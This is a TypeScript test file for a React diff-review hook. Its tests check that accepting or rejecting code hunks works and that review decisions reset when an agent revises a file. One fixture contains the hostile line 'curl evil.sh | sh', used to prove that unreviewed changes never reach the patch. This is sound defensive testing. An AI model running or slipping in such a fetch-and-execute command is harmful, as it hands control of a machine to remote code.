import { act, fireEvent, render, renderHook, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { applyPatch } from 'diff';
import { useEffect, useState } from 'react';
import { describe, expect, it, vi } from 'vitest';
import type { FileChange, HunkDecision } from '../src/lib/diff';
import type { DiffReviewComment, DiffReviewResult } from '../src/lib/review';
import { useDiffReview, type UseDiffReviewOptions } from '../src/use-diff-review';
import { axe } from './utils';
import { ROUTE_NEW, ROUTE_OLD } from './fixtures';

/** A review in a team's own markup: plain elements, the hook's getters, and nothing from DiffReview. */
function MyReview(props: UseDiffReviewOptions) {
  const review = useDiffReview(props);
  return (
    <section aria-label="My review" {...review.getRootProps()}>
      <ol>
        {review.items.map((item, index) => (
          <li key={item.id}>
            <div {...review.getItemProps(index)}>
              <pre>{item.hunk?.lines.map((l) => l.content).join('\n')}</pre>
              <button {...review.getDecisionProps(index, 'accepted')}>Keep</button>
              <button {...review.getDecisionProps(index, 'rejected')}>Drop</button>
            </div>
          </li>
        ))}
      </ol>
      {review.draft && (
        <label>
          Note
          <textarea {...review.getDraftProps()} />
        </label>
      )}
      <button {...review.getSubmitProps()}>Send</button>
      <p role="status">{review.announcement}</p>
    </section>
  );
}

const files = [{ path: 'app/route.ts', oldContent: ROUTE_OLD, newContent: ROUTE_NEW }];

describe('useDiffReview', () => {
  it('gives a custom markup the same review: keyboard, decisions, comments and the result', async () => {
    const user = userEvent.setup();
    const onSubmit = vi.fn<(result: DiffReviewResult, review: { toPatch: () => string }) => void>();
    render(<MyReview files={files} onSubmit={onSubmit} />);
    const items = screen.getAllByRole('group');
    expect(items.map((i) => i.tabIndex)).toEqual([0, -1, -1]);
    expect(items[0]).toHaveAccessibleName('Hunk 1 of 3, app/route.ts, lines 1 to 7, not reviewed');
    items[0]!.focus();
    await user.keyboard('a');
    expect(items[1]).toHaveFocus();
    expect(screen.getByRole('status')).toHaveTextContent('Hunk 1 of 3 accepted. 2 remaining.');
    await user.keyboard('r');
    expect(items[1]).toHaveAttribute('data-decision', 'rejected');
    // A comment, written in the custom textarea.
    await user.keyboard('{Shift>}{ArrowDown}{/Shift}c');
    expect(screen.getByRole('textbox', { name: 'Note' })).toHaveFocus();
    await user.keyboard('Why 29?{Control>}{Enter}{/Control}');
    await user.click(screen.getAllByRole('button', { name: 'Keep' })[2]!);
    expect(screen.getAllByRole('button', { name: 'Keep' })[2]).toHaveAttribute('aria-pressed', 'true');
    await user.click(screen.getByRole('button', { name: 'Send' }));
    const [result, review] = onSubmit.mock.calls[0]!;
    expect(result).toMatchObject({ accepted: 2, rejected: 1, pending: 0 });
    expect(result.comments).toMatchObject([{ target: 'lines', text: 'Why 29?' }]);
    expect(applyPatch(ROUTE_OLD, review.toPatch())).toBe(result.files[0]!.content);
    expect(await axe(document.body)).toHaveNoViolations();
  });

  it('computes the result on demand, and applies nothing while read-only', async () => {
    const user = userEvent.setup();
    const onSubmit = vi.fn();
    const seen: Array<ReturnType<typeof useDiffReview>> = [];
    function Probe(props: UseDiffReviewOptions) {
      const review = useDiffReview(props);
      useEffect(() => {
        seen.push(review);
      });
      return <MyReview {...props} />;
    }
    render(<Probe files={files} readOnly onSubmit={onSubmit} defaultDecisions={{ 'app/route.ts:0': 'accepted' }} />);
    const latest = () => seen.at(-1)!;
    expect(latest().result().accepted).toBe(1);
    expect(latest().toPatch()).toContain('+import { ratelimit }');
    screen.getAllByRole('group')[0]!.focus();
    await user.keyboard('r{Control>}{Enter}{/Control}');
    expect(onSubmit).not.toHaveBeenCalled();
    expect(latest().decisions).toEqual({ 'app/route.ts:0': 'accepted' });
  });

  it('leaves keys pressed inside a data-signoff-slot element to your controls', async () => {
    const user = userEvent.setup();
    const onSubmit = vi.fn();
    function WithToolbar(props: UseDiffReviewOptions) {
      const review = useDiffReview(props);
      return (
        <section aria-label="My review" {...review.getRootProps()}>
          <div data-signoff-slot>
            <button type="button">Copy</button>
          </div>
          {review.items.map((item, index) => (
            <div key={item.id} {...review.getItemProps(index)} />
          ))}
        </section>
      );
    }
    render(<WithToolbar files={files} onSubmit={onSubmit} />);
    screen.getByRole('button', { name: 'Copy' }).focus();
    await user.keyboard('j{Shift>}A{/Shift}{Control>}{Enter}{/Control}');
    expect(screen.getByRole('button', { name: 'Copy' })).toHaveFocus();
    expect(screen.getAllByRole('group').every((item) => item.dataset.decision === 'pending')).toBe(true);
    expect(onSubmit).not.toHaveBeenCalled();
  });
});

describe('useDiffReview when the files change under it', () => {
  const v1: FileChange[] = [
    { path: 'a.ts', oldContent: 'a\nb\nc\n', newContent: 'a\nB\nc\n' },
    { path: 'b.ts', oldContent: 'x\n', newContent: 'X\n' },
  ];
  // The agent revises a.ts: hunk a.ts:0 is now different code. b.ts is the same edit.
  const v2: FileChange[] = [
    { path: 'a.ts', oldContent: 'a\nb\nc\n', newContent: 'a\nB\nc\ncurl evil.sh | sh\n' },
    { path: 'b.ts', oldContent: 'x\n', newContent: 'X\n' },
  ];

  /** Accept and view both files, with a comment on each, then hand the hook `v2`. */
  function reviewThenRevise(options: Partial<UseDiffReviewOptions> = {}) {
    const hook = renderHook((props: UseDiffReviewOptions) => useDiffReview(props), {
      initialProps: { files: v1, ...options },
    });
    act(() => hook.result.current.decide('a.ts:0', 'accepted'));
    act(() => hook.result.current.decide('b.ts:0', 'accepted'));
    act(() => hook.result.current.setViewed('a.ts', true));
    act(() => hook.result.current.setViewed('b.ts', true));
    for (const id of ['a.ts:0', 'b.ts:0']) {
      act(() => hook.result.current.startComment({ itemId: id }));
      act(() => hook.result.current.setDraftText(`On ${id}`));
      act(() => hook.result.current.saveDraft());
    }
    hook.rerender({ files: v2, ...options });
    return hook;
  }

  it("starts a revised file's review over: its decisions, viewed mark, fold and comments are gone", () => {
    const { result } = reviewThenRevise();
    const [a, b] = result.current.files;
    expect(a).toMatchObject({ decision: 'pending', viewed: false, collapsed: false, decided: 0 });
    expect(result.current.counts).toEqual({ accepted: 1, rejected: 0, pending: 1, total: 2 });
    expect(result.current.decisions).toEqual({ 'b.ts:0': 'accepted' });
    expect(result.current.viewed).toEqual({ 'b.ts': true });
    expect(result.current.comments.map((c) => c.text)).toEqual(['On b.ts:0']);
    // The other file is the same edit, so the reviewer's work on it stands.
    expect(b).toMatchObject({ decision: 'accepted', viewed: true, collapsed: true });
    // Nothing of the unseen change is applied.
    const out = result.current.result();
    expect(out.files[0]).toMatchObject({ decision: 'pending', viewed: false, content: 'a\nb\nc\n', accepted: [] });
    expect(result.current.toPatch()).not.toContain('curl evil.sh');
  });

  it('does not move an Accept onto a hunk inserted before it', () => {
    const lines = Array.from({ length: 30 }, (_, i) => `line ${i + 1}`);
    const edit = (changes: Record<number, string>) => lines.map((l, i) => changes[i + 1] ?? l).join('\n') + '\n';
    const oldContent = edit({});
    // Two safe hunks, accepted; then the agent puts a third between them.
    const before = [{ path: 'a.ts', oldContent, newContent: edit({ 1: 'SAFE', 30: 'SAFE' }) }];
    const after = [{ path: 'a.ts', oldContent, newContent: edit({ 1: 'SAFE', 15: 'DANGEROUS', 30: 'SAFE' }) }];
    const { result, rerender } = renderHook((props: UseDiffReviewOptions) => useDiffReview(props), {
      initialProps: { files: before },
    });
    act(() => result.current.decideAll('accepted'));
    expect(result.current.decisions).toEqual({ 'a.ts:0': 'accepted', 'a.ts:1': 'accepted' });
    rerender({ files: after });
    expect(result.current.items).toHaveLength(3);
    expect(result.current.counts.accepted).toBe(0);
    expect(result.current.result().files[0]!.content).not.toContain('DANGEROUS');
  });

  it('keeps everything when the files are the same edits again, in a new array or in another order', () => {
    const { result, rerender } = renderHook((props: UseDiffReviewOptions) => useDiffReview(props), {
      initialProps: { files: v1 },
    });
    act(() => result.current.decide('a.ts:0', 'accepted'));
    act(() => result.current.setViewed('a.ts', true));
    rerender({ files: v1.map((f) => ({ ...f })) });
    rerender({ files: [v1[1]!, { ...v1[0]!, language: 'ts' }] });
    expect(result.current.decisions).toEqual({ 'a.ts:0': 'accepted' });
    expect(result.current.viewed).toEqual({ 'a.ts': true });
  });

  it('tells its listeners what it dropped', () => {
    const onDecisionsChange = vi.fn();
    const onViewedChange = vi.fn();
    const onCommentsChange = vi.fn();
    reviewThenRevise({ onDecisionsChange, onViewedChange, onCommentsChange });
    expect(onDecisionsChange).toHaveBeenLastCalledWith({ 'b.ts:0': 'accepted' });
    expect(onViewedChange).toHaveBeenLastCalledWith({ 'b.ts': true });
    expect(onCommentsChange).toHaveBeenLastCalledWith([expect.objectContaining({ fileId: 'b.ts' })]);
  });

  it('asks the owner of controlled state to drop it, and leaves it out until then', () => {
    type Owner = {
      decisions: Record<string, HunkDecision>;
      viewed: Record<string, boolean>;
      comments: DiffReviewComment[];
    };
    const renders: Array<{ review: ReturnType<typeof useDiffReview>; owner: Owner }> = [];
    function Controlled({ files, listen }: { files: FileChange[]; listen: boolean }) {
      const [decisions, setDecisions] = useState<Record<string, HunkDecision>>({
        'a.ts:0': 'accepted',
        'b.ts:0': 'rejected',
      });
      const [viewed, setViewed] = useState<Record<string, boolean>>({ 'a.ts': true, 'b.ts': true });
      const [comments, setComments] = useState<DiffReviewComment[]>([
        { id: 'c1', fileId: 'a.ts', path: 'a.ts', target: 'hunk', hunkId: 'a.ts:0', text: 'Fine' },
      ]);
      const review = useDiffReview({
        files,
        decisions,
        viewed,
        comments,
        // An owner that does not listen keeps passing the same values.
        ...(listen
          ? { onDecisionsChange: setDecisions, onViewedChange: setViewed, onCommentsChange: setComments }
          : {}),
      });
      renders.push({ review, owner: { decisions, viewed, comments } });
      return null;
    }
    const listening = render(<Controlled files={v1} listen />);
    listening.rerender(<Controlled files={v2} listen />);
    // Not one render, committed or not, gives the revised file its old Accept or viewed mark.
    const revised = renders.slice(renders.findIndex((r) => r.review.files[0]!.change === v2[0]));
    expect(revised.every(({ review }) => review.decisions['a.ts:0'] === undefined && !review.files[0]!.viewed)).toBe(
      true,
    );
    expect(renders.at(-1)!.owner).toEqual({
      decisions: { 'b.ts:0': 'rejected' },
      viewed: { 'b.ts': true },
      comments: [],
    });
    listening.unmount();

    renders.length = 0;
    const deaf = render(<Controlled files={v1} listen={false} />);
    deaf.rerender(<Controlled files={v2} listen={false} />);
    deaf.rerender(<Controlled files={v2} listen={false} />);
    const { review, owner } = renders.at(-1)!;
    expect(owner.decisions).toEqual({ 'a.ts:0': 'accepted', 'b.ts:0': 'rejected' });
    expect(review.decisions).toEqual({ 'b.ts:0': 'rejected' });
    expect(review.comments).toEqual([]);
    expect(review.files[0]).toMatchObject({ viewed: false, collapsed: false });
  });

  it('takes controlled state passed with the new files as meant for them', () => {
    const onDecisionsChange = vi.fn();
    const { result, rerender } = renderHook((props: UseDiffReviewOptions) => useDiffReview(props), {
      initialProps: { files: v1, decisions: { 'a.ts:0': 'rejected' }, onDecisionsChange } as UseDiffReviewOptions,
    });
    // Another review, say one shown again from its saved result, with its own decisions.
    rerender({ files: v2, decisions: { 'a.ts:0': 'accepted' }, onDecisionsChange });
    expect(result.current.decisions).toEqual({ 'a.ts:0': 'accepted' });
    expect(onDecisionsChange).not.toHaveBeenCalled();
  });

  it('drops the selection and the comment being written on a revised file', () => {
    const { result, rerender } = renderHook((props: UseDiffReviewOptions) => useDiffReview(props), {
      initialProps: { files: v1 },
    });
    act(() => result.current.selectLines('a.ts:0', 0, 1));
    act(() => result.current.startComment());
    act(() => result.current.setDraftText('About the old line'));
    rerender({ files: v2 });
    expect(result.current.selection).toBeUndefined();
    expect(result.current.draft).toBeUndefined();
    act(() => result.current.saveDraft());
    expect(result.current.comments).toEqual([]);
  });

  type Decisions = Record<string, HunkDecision>;
  const both: Decisions = { 'a.ts:0': 'accepted', 'b.ts:0': 'accepted' };
  const noted = (fileId: string): DiffReviewComment => ({
    id: `on-${fileId}`,
    fileId,
    path: fileId,
    target: 'hunk',
    hunkId: `${fileId}:0`,
    text: 'Fine',
  });

  // What a component that renders its own markup may build as it renders: a new object every time.
  it('settles when controlled values are built on every render: { ...state }, {} and saved ?? []', () => {
    const renders: Array<{ review: ReturnType<typeof useDiffReview>; owner: Decisions }> = [];
    function Rebuilt({ files }: { files: FileChange[] }) {
      const [decisions, setDecisions] = useState<Decisions>(both);
      const [saved] = useState<DiffReviewComment[]>();
      const review = useDiffReview({
        files,
        decisions: { ...decisions },
        onDecisionsChange: setDecisions,
        viewed: {},
        comments: saved ?? [],
      });
      renders.push({ review, owner: decisions });
      return null;
    }
    const view = render(<Rebuilt files={v1} />);
    view.rerender(<Rebuilt files={v1} />);
    view.rerender(<Rebuilt files={v1} />);
    expect(renders.at(-1)!.review.decisions).toEqual(both);
    const revisedFrom = renders.length;
    view.rerender(<Rebuilt files={v2} />);
    view.rerender(<Rebuilt files={v2} />);
    expect(renders.slice(revisedFrom).every(({ review }) => review.decisions['a.ts:0'] === undefined)).toBe(true);
    expect(renders.at(-1)!.review.counts).toMatchObject({ accepted: 1, pending: 1 });
    expect(renders.at(-1)!.owner).toEqual({ 'b.ts:0': 'accepted' });
  });

  it('leaves a revised file out of controlled values built with Object.fromEntries or copied', () => {
    type Owner = { decisions: Decisions; viewed: Record<string, boolean>; comments: DiffReviewComment[] };
    const renders: Array<{ review: ReturnType<typeof useDiffReview>; owner: Owner }> = [];
    function Rebuilt({ files }: { files: FileChange[] }) {
      const [decisions, setDecisions] = useState<Decisions>(both);
      const [viewed, setViewed] = useState<Record<string, boolean>>({ 'a.ts': true, 'b.ts': true });
      const [comments, setComments] = useState<DiffReviewComment[]>([noted('a.ts'), noted('b.ts')]);
      const review = useDiffReview({
        files,
        decisions: Object.fromEntries(Object.entries(decisions)),
        viewed: { ...viewed },
        comments: [...comments],
        onDecisionsChange: setDecisions,
        onViewedChange: setViewed,
        onCommentsChange: setComments,
      });
      renders.push({ review, owner: { decisions, viewed, comments } });
      return null;
    }
    const view = render(<Rebuilt files={v1} />);
    view.rerender(<Rebuilt files={v1} />);
    view.rerender(<Rebuilt files={v1} />);
    const revisedFrom = renders.length;
    view.rerender(<Rebuilt files={v2} />);
    view.rerender(<Rebuilt files={v2} />);
    // Not one render after the revision, committed or not, gives the revised file its old state.
    for (const { review } of renders.slice(revisedFrom)) {
      expect(review.decisions['a.ts:0']).toBeUndefined();
      expect(review.files[0]).toMatchObject({ viewed: false, collapsed: false });
      expect(review.comments.map((c) => c.fileId)).toEqual(['b.ts']);
    }
    expect(renders.at(-1)!.owner).toEqual({
      decisions: { 'b.ts:0': 'accepted' },
      viewed: { 'b.ts': true },
      comments: [noted('b.ts')],
    });
  });

  /** An owner that keeps the files and decisions in one state, and revises them in one update. */
  function reviseInOneUpdate(next: (decisions: Decisions) => Decisions) {
    const reviews: Array<ReturnType<typeof useDiffReview>> = [];
    function Owner() {
      const [state, setState] = useState({ files: v1, decisions: both });
      reviews.push(
        useDiffReview({
          files: state.files,
          decisions: state.decisions,
          onDecisionsChange: (decisions) => setState((s) => ({ ...s, decisions })),
        }),
      );
      return (
        <button type="button" onClick={() => setState((s) => ({ files: v2, decisions: next(s.decisions) }))}>
          Revise
        </button>
      );
    }
    const view = render(<Owner />);
    fireEvent.click(screen.getByRole('button', { name: 'Revise' }));
    view.unmount();
    return reviews.at(-1)!;
  }

  it("drops a revised file's entries that the owner passes again with the new files", () => {
    // Copied in the update that revises a.ts: the same entries, so still about the old edit.
    expect(reviseInOneUpdate((d) => ({ ...d })).decisions).toEqual({ 'b.ts:0': 'accepted' });
    // Another file's entries changed in that update say nothing about a.ts.
    expect(reviseInOneUpdate((d) => ({ ...d, 'b.ts:0': 'rejected' })).decisions).toEqual({ 'b.ts:0': 'rejected' });
    // New entries for a.ts itself are the owner's say about the new edit.
    expect(reviseInOneUpdate((d) => ({ ...d, 'a.ts:0': 'rejected' })).decisions).toEqual({
      'a.ts:0': 'rejected',
      'b.ts:0': 'accepted',
    });
  });

  it('lets the reviewer decide the revised hunk as the old one was, on its own value or a controlled one', () => {
    const own = renderHook((props: UseDiffReviewOptions) => useDiffReview(props), { initialProps: { files: v1 } });
    act(() => own.result.current.decide('a.ts:0', 'accepted'));
    own.rerender({ files: v2 });
    expect(own.result.current.decisions).toEqual({});
    act(() => own.result.current.decide('a.ts:0', 'accepted'));
    expect(own.result.current.decisions).toEqual({ 'a.ts:0': 'accepted' });
    expect(own.result.current.result().files[0]!.accepted).toEqual(['a.ts:0']);

    const reviews: Array<ReturnType<typeof useDiffReview>> = [];
    function Rebuilt({ files }: { files: FileChange[] }) {
      const [decisions, setDecisions] = useState<Decisions>({});
      reviews.push(useDiffReview({ files, decisions: { ...decisions }, onDecisionsChange: setDecisions }));
      return null;
    }
    const view = render(<Rebuilt files={v1} />);
    act(() => reviews.at(-1)!.decide('a.ts:0', 'accepted'));
    view.rerender(<Rebuilt files={v2} />);
    expect(reviews.at(-1)!.decisions).toEqual({});
    act(() => reviews.at(-1)!.decide('a.ts:0', 'accepted'));
    expect(reviews.at(-1)!.decisions).toEqual({ 'a.ts:0': 'accepted' });
  });
});

describe('useDiffReview comments on removed lines', () => {
  const files = [{ path: 'a.ts', oldContent: 'keep\nsecret = load()\nend\n', newContent: 'keep\nend\n' }];

  function commentOn(from: number, to: number, change: FileChange[] = files) {
    const { result } = renderHook(() => useDiffReview({ files: change }));
    act(() => result.current.selectLines(`${change[0]!.path}:0`, from, to));
    act(() => result.current.startComment());
    act(() => result.current.setDraftText('Do not remove this line'));
    act(() => result.current.saveDraft());
    return result.current.result().comments[0]!;
  }

  it('keeps a removed line at the edge of the selection in the comment and its excerpt', () => {
    // " keep" and "-secret = load()": the line the comment is about is the removed one.
    const comment = commentOn(0, 1);
    expect(comment).toMatchObject({ side: 'new', startLine: 1, endLine: 1, oldStartLine: 1, oldEndLine: 2 });
    expect(comment.excerpt).toBe(' keep\n-secret = load()');
  });

  it('keeps the removed half of a replaced line', () => {
    const replaced = [{ path: 'b.ts', oldContent: 'a\nb\nc\n', newContent: 'a\nB\nc\n' }];
    // "-b" and "+B", as Shift and the arrows select a whole change.
    const comment = commentOn(1, 2, replaced);
    expect(comment).toMatchObject({ side: 'new', startLine: 2, endLine: 2, oldStartLine: 2, oldEndLine: 2 });
    expect(comment.excerpt).toBe('-b\n+B');
  });

  it('adds nothing when no removed line is selected', () => {
    const added = [{ path: 'c.ts', oldContent: 'a\n', newContent: 'a\nb\n' }];
    const comment = commentOn(0, 1, added);
    expect(comment).toMatchObject({ side: 'new', startLine: 1, endLine: 2 });
    expect(comment).not.toHaveProperty('oldStartLine');
    const removedOnly = commentOn(1, 1);
    expect(removedOnly).toMatchObject({ side: 'old', startLine: 2, endLine: 2, excerpt: '-secret = load()' });
    expect(removedOnly).not.toHaveProperty('oldStartLine');
  });
});
